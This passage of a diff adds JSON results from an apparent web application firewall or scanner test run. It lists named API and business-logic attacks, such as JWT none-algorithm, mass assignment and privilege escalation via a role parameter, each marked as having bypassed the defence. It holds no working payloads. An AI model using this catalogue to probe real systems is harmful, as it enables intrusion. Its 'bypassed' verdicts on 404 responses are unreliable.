+          "CWE-400",
+          "NIST:SC-5"
+        ],
+        "payload": "GraphQL Batch Query Flood",
+        "status": 302,
+        "latency": 2,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "api-3",
+        "name": "GraphQL Field Enumeration",
+        "category": "API Security",
+        "tags": [
+          "OWASP:A05",
+          "CWE-284"
+        ],
+        "payload": "GraphQL Field Enumeration",
+        "status": 302,
+        "latency": 6,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "api-4",
+        "name": "JWT None Algorithm",
+        "category": "API Security",
+        "tags": [
+          "OWASP:A02",
+          "CWE-347",
+          "NIST:IA-5",
+          "PCI:6.4"
+        ],
+        "payload": "JWT None Algorithm",
+        "status": 302,
+        "latency": 1,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "api-5",
+        "name": "JWT Algorithm Confusion (RS->HS)",
+        "category": "API Security",
+        "tags": [
+          "OWASP:A02",
+          "CWE-347",
+          "NIST:IA-5"
+        ],
+        "payload": "JWT Algorithm Confusion (RS->HS)",
+        "status": 302,
+        "latency": 2,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "api-6",
+        "name": "Mass Assignment (role escalation)",
+        "category": "API Security",
+        "tags": [
+          "OWASP:A03",
+          "CWE-915",
+          "NIST:AC-3",
+          "PCI:6.4"
+        ],
+        "payload": "Mass Assignment (role escalation)",
+        "status": 302,
+        "latency": 1,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "api-7",
+        "name": "HTTP Verb Tampering (DELETE)",
+        "category": "API Security",
+        "tags": [
+          "OWASP:A01",
+          "CWE-284",
+          "NIST:AC-3"
+        ],
+        "payload": "HTTP Verb Tampering (DELETE)",
+        "status": 302,
+        "latency": 2,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "api-8",
+        "name": "HTTP Verb Tampering (PUT)",
+        "category": "API Security",
+        "tags": [
+          "OWASP:A01",
+          "CWE-284",
+          "NIST:AC-3"
+        ],
+        "payload": "HTTP Verb Tampering (PUT)",
+        "status": 302,
+        "latency": 2,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "api-9",
+        "name": "BOLA - Object Level Auth Bypass",
+        "category": "API Security",
+        "tags": [
+          "OWASP:A01",
+          "CWE-639",
+          "NIST:AC-3",
+          "PCI:6.4"
+        ],
+        "payload": "BOLA - Object Level Auth Bypass",
+        "status": 404,
+        "latency": 4,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 404 — payload reached origin"
+      },
+      {
+        "id": "api-10",
+        "name": "Content-Type Confusion Attack",
+        "category": "API Security",
+        "tags": [
+          "OWASP:A03",
+          "CWE-436",
+          "NIST:SI-10"
+        ],
+        "payload": "Content-Type Confusion Attack",
+        "status": 302,
+        "latency": 1,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      }
+    ],
+    "bizlogic": [
+      {
+        "id": "bl-1",
+        "name": "Negative Quantity (price manipulation)",
+        "category": "Business Logic",
+        "tags": [
+          "OWASP:A01",
+          "CWE-840",
+          "NIST:AC-3",
+          "PCI:6.4"
+        ],
+        "payload": "Negative Quantity (price manipulation)",
+        "status": 302,
+        "latency": 7,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "bl-2",
+        "name": "Zero-price product submission",
+        "category": "Business Logic",
+        "tags": [
+          "OWASP:A01",
+          "CWE-840",
+          "NIST:AC-3",
+          "PCI:6.4"
+        ],
+        "payload": "Zero-price product submission",
+        "status": 302,
+        "latency": 2,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "bl-3",
+        "name": "Admin endpoint direct access",
+        "category": "Business Logic",
+        "tags": [
+          "OWASP:A01",
+          "CWE-284",
+          "NIST:AC-3",
+          "PCI:6.4"
+        ],
+        "payload": "Admin endpoint direct access",
+        "status": 404,
+        "latency": 2,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 404 — payload reached origin"
+      },
+      {
+        "id": "bl-4",
+        "name": "HTTP Parameter Pollution (role dup)",
+        "category": "Business Logic",
+        "tags": [
+          "OWASP:A01",
+          "CWE-235",
+          "NIST:SI-10"
+        ],
+        "payload": "HTTP Parameter Pollution (role dup)",
+        "status": 302,
+        "latency": 3,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "bl-5",
+        "name": "Account Enumeration (timing probe)",
+        "category": "Business Logic",
+        "tags": [
+          "OWASP:A07",
+          "CWE-204",
+          "NIST:IA-5",
+          "PCI:6.4"
+        ],
+        "payload": "Account Enumeration (timing probe)",
+        "status": 302,
+        "latency": 4,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      },
+      {
+        "id": "bl-6",
+        "name": "Excessive Data Exposure (verbose error)",
+        "category": "Business Logic",
+        "tags": [
+          "OWASP:A02",
+          "CWE-209",
+          "NIST:SI-11"
+        ],
+        "payload": "Excessive Data Exposure (verbose error)",
+        "status": 404,
+        "latency": 1,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 404 — payload reached origin"
+      },
+      {
+        "id": "bl-7",
+        "name": "Forced Browsing - hidden endpoint",
+        "category": "Business Logic",
+        "tags": [
+          "OWASP:A01",
+          "CWE-284",
+          "NIST:AC-3",
+          "PCI:6.4"
+        ],
+        "payload": "Forced Browsing - hidden endpoint",
+        "status": 404,
+        "latency": 1,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 404 — payload reached origin"
+      },
+      {
+        "id": "bl-8",
+        "name": "Privilege Escalation via role parameter",
+        "category": "Business Logic",
+        "tags": [
+          "OWASP:A01",
+          "CWE-269",
+          "NIST:AC-6",
+          "PCI:6.4"
+        ],
+        "payload": "Privilege Escalation via role parameter",
+        "status": 302,
+        "latency": 2,
+        "blocked": false,
+        "confidence": "bypassed",
+        "reason": "HTTP 302 — response matches baseline structure, payload reached origin"
+      }
+    ]
+  }
+}
